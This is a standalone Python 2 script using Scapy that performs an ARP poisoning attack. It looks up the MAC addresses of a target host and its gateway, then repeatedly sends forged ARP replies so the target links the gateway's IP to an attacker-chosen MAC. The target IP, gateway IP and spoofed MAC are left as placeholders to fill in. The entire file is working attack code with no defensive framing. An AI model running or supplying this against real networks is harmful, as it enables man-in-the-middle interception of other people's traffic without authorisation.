from scapy.all import *

import os

import threading

import signal

interface = "wlp3s0"

target_ip = "INPUT HERE"

gateway_ip = "INPUT HERE"

def get_mac(ip):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,retry=10)

    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src

    return None

def poison(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_target.hwsrc = "INPUT HERE"

#    poison_gateway = ARP()
#    poison_gateway.op = 2
#    poison_gateway.psrc = target_ip
#    poison_gateway.pdst = gateway_ip
#    poison_gateway.hwdst = gateway_mac

    while True:
        send(poison_target)
#        send(poison_gateway)
        time.sleep(2)


gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "Failed to get gateway_mac. Exiting"
    sys.exit(0)
else:
    print "Gateway is %s at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "Failed to get target_mac. Exiting"
    sys.exit(0)
else:
    print "Targer is %s at %s" % (target_ip, target_mac)

### starting poisioning threading
poisoning_thread = threading.Thread(target=poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poisoning_thread.start()
print "ARP poison attack finished."
